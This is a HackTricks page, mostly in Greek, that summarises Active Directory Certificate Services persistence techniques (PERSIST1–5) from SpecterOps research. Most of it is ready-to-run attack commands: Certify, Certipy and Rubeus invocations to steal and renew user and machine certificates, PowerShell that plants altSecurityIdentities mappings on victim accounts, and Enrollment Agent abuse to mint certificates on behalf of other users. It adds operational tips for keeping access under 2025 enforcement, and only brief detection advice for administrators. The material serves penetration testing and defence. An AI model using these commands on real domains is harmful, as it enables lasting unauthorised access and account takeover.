# AD CS Διατήρηση λογαριασμού

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια μικρή σύνοψη των κεφαλαίων για τη διατήρηση λογαριασμών της εξαιρετικής έρευνας από [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Κατανόηση της κλοπής διαπιστευτηρίων ενεργού χρήστη με πιστοποιητικά – PERSIST1

Σε ένα σενάριο όπου ένα πιστοποιητικό που επιτρέπει την αυθεντικοποίηση στο domain μπορεί να ζητηθεί από έναν χρήστη, ένας επιτιθέμενος έχει την ευκαιρία να ζητήσει και να κλέψει αυτό το πιστοποιητικό για να διατηρήσει επίμονη παρουσία σε ένα δίκτυο. Από προεπιλογή, το πρότυπο `User` στο Active Directory επιτρέπει τέτοιου είδους αιτήματα, αν και μερικές φορές μπορεί να είναι απενεργοποιημένο.

Χρησιμοποιώντας [Certify](https://github.com/GhostPack/Certify) ή [Certipy](https://github.com/ly4k/Certipy), μπορείτε να αναζητήσετε ενεργοποιημένα πρότυπα που επιτρέπουν αυθεντικοποίηση πελάτη και στη συνέχεια να ζητήσετε ένα:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Η δύναμη ενός πιστοποιητικού έγκειται στην ικανότητά του να αυθεντικοποιείται ως ο χρήστης στον οποίο ανήκει, ανεξάρτητα από αλλαγές κωδικού πρόσβασης, εφόσον το πιστοποιητικό παραμένει έγκυρο.

Μπορείτε να μετατρέψετε PEM σε PFX και να το χρησιμοποιήσετε για να αποκτήσετε ένα TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Σημείωση: Σε συνδυασμό με άλλες τεχνικές (βλέπε THEFT sections), certificate-based auth επιτρέπει μόνιμη πρόσβαση χωρίς να αγγίζεται το LSASS και ακόμη και από μη ανυψωμένα περιβάλλοντα.

## Απόκτηση μόνιμης πρόσβασης μηχανήματος με πιστοποιητικά - PERSIST2

Εάν ένας επιτιθέμενος έχει αυξημένα προνόμια σε έναν host, μπορεί να εγγράψει τον λογαριασμό μηχανήματος του συμβιβασμένου συστήματος για ένα πιστοποιητικό χρησιμοποιώντας το προεπιλεγμένο `Machine` template. Η αυθεντικοποίηση ως το μηχάνημα ενεργοποιεί το S4U2Self για τοπικές υπηρεσίες και μπορεί να παρέχει ανθεκτική μόνιμη παρουσία στο host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Επέκταση της επιμονής μέσω ανανέωσης πιστοποιητικού - PERSIST3

Η κατάχρηση των περιόδων ισχύος και ανανέωσης των προτύπων πιστοποιητικών επιτρέπει σε έναν επιτιθέμενο να διατηρεί μακροχρόνια πρόσβαση. Εάν κατέχετε ένα προηγουμένως εκδοθέν πιστοποιητικό και το ιδιωτικό του κλειδί, μπορείτε να το ανανεώσετε πριν τη λήξη για να αποκτήσετε ένα νέο, μακρόβιο διαπιστευτήριο χωρίς να αφήσετε πρόσθετα artifacts αιτήσεων συνδεδεμένα με τον αρχικό principal.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Λειτουργική συμβουλή: Παρακολουθήστε τους χρόνους ζωής των PFX αρχείων που κατέχει ο επιτιθέμενος και ανανεώνετε νωρίς. Η ανανέωση μπορεί επίσης να κάνει τα ενημερωμένα πιστοποιητικά να συμπεριλάβουν τη σύγχρονη επέκταση αντιστοίχισης SID, διατηρώντας τα χρησιμοποιήσιμα υπό αυστηρότερους κανόνες αντιστοίχισης DC (βλέπε επόμενη ενότητα).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Εάν μπορείτε να γράψετε στο attribute `altSecurityIdentities` ενός λογαριασμού-στόχου, μπορείτε να αντιστοιχίσετε ρητά ένα πιστοποιητικό που ελέγχεται από τον επιτιθέμενο σε εκείνον τον λογαριασμό. Αυτό παραμένει μετά από αλλαγές κωδικών και, όταν χρησιμοποιούνται ισχυρές μορφές αντιστοίχισης, διατηρείται λειτουργικό υπό τη σύγχρονη επιβολή του DC.

Βασική ροή:

1. Αποκτήστε ή εκδώστε ένα client-auth πιστοποιητικό που ελέγχετε (π.χ., enroll `User` template ως εσάς).
2. Εξαγάγετε έναν ισχυρό αναγνωριστικό από το πιστοποιητικό (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Προσθέστε μια ρητή αντιστοίχιση στο `altSecurityIdentities` του principal-θύματος χρησιμοποιώντας αυτόν τον αναγνωριστικό.
4. Πιστοποιηθείτε με το πιστοποιητικό σας· ο DC το αντιστοιχίζει στο θύμα μέσω της ρητής αντιστοίχισης.

Παράδειγμα (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Στη συνέχεια, αυθεντικοποιηθείτε με το PFX. Certipy θα αποκτήσει απευθείας ένα TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Δημιουργία ισχυρών χαρτογραφήσεων `altSecurityIdentities`

Στην πράξη, οι χαρτογραφήσεις **Issuer+Serial** και **SKI** είναι οι πιο εύκολες μορφές ισχυρής αντιστοίχισης που μπορούν να δημιουργηθούν από ένα πιστοποιητικό που κατέχει ο επιτιθέμενος. Αυτό έχει σημασία μετά τις **11 Φεβρουαρίου 2025**, όταν οι DCs θα έχουν ως προεπιλογή το **Full Enforcement** και οι αδύναμες αντιστοιχίσεις δεν θα είναι πλέον αξιόπιστες.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Σημειώσεις
- Χρησιμοποιήστε μόνο ισχυρούς τύπους αντιστοίχισης: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Οι αδύναμες μορφές (Subject/Issuer, Subject-only, RFC822 email) είναι deprecated και μπορούν να μπλοκαριστούν από πολιτική του DC.
- Η αντιστοίχιση λειτουργεί τόσο σε αντικείμενα **user** όσο και **computer**, επομένως η δυνατότητα εγγραφής στο `altSecurityIdentities` ενός λογαριασμού υπολογιστή αρκεί για να παραμείνετε persistent ως αυτή η μηχανή.
- Η αλυσίδα πιστοποιητικών πρέπει να χτίζει έως ένα root που εμπιστεύεται ο DC. Enterprise CAs στο NTAuth συνήθως εμπιστεύονται· κάποια περιβάλλοντα εμπιστεύονται επίσης public CAs.
- Η Schannel authentication παραμένει χρήσιμη για persistence ακόμη και όταν το PKINIT αποτυγχάνει επειδή ο DC δεν διαθέτει το Smart Card Logon EKU ή επιστρέφει `KDC_ERR_PADATA_TYPE_NOSUPP`.

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Απαιτείται ανάκληση του agent certificate ή των template permissions για να εκδιωχθεί αυτή η persistence.

Operational notes
- Οι σύγχρονες εκδόσεις του `Certipy` υποστηρίζουν τόσο το `-on-behalf-of` όσο και το `-renew`, οπότε ένας attacker που κατέχει ένα Enrollment Agent PFX μπορεί να χορηγήσει και στη συνέχεια να ανανεώσει leaf certificates χωρίς να επανεπεξεργαστεί τον αρχικό target account.
- Αν η ανάκτηση TGT βασισμένη σε PKINIT δεν είναι δυνατή, το προκύπτον on-behalf-of certificate εξακολουθεί να είναι χρησιμοποιήσιμο για Schannel authentication με `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Το Microsoft KB5014754 εισήγαγε το Strong Certificate Mapping Enforcement στους domain controllers. Από τις 11 Φεβρουαρίου 2025, οι DCs έχουν ως προεπιλογή το Full Enforcement, απορρίπτοντας weak/ambiguous mappings. Πρακτικές επιπτώσεις:

- Πιστοποιητικά pre-2022 που στερούνται του SID mapping extension ενδέχεται να αποτύχουν στον implicit mapping όταν οι DCs είναι σε Full Enforcement. Οι attackers μπορούν να διατηρήσουν πρόσβαση είτε ανανεώνοντας πιστοποιητικά μέσω του AD CS (για να αποκτήσουν το SID extension) είτε τοποθετώντας μια strong explicit mapping στο `altSecurityIdentities` (PERSIST4).
- Οι explicit mappings που χρησιμοποιούν strong formats (Issuer+Serial, SKI, SHA1-PublicKey) συνεχίζουν να λειτουργούν. Τα weak formats (Issuer/Subject, Subject-only, RFC822) μπορούν να μπλοκαριστούν και θα πρέπει να αποφεύγονται για persistence.

Οι administrators θα πρέπει να επιτηρούν και να ειδοποιούν για:
- Αλλαγές στο `altSecurityIdentities` και εκδόσεις/ανανεώσεις των Enrollment Agent και User certificates.
- Τα CA issuance logs για on-behalf-of requests και ασυνήθιστα renewal patterns.

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
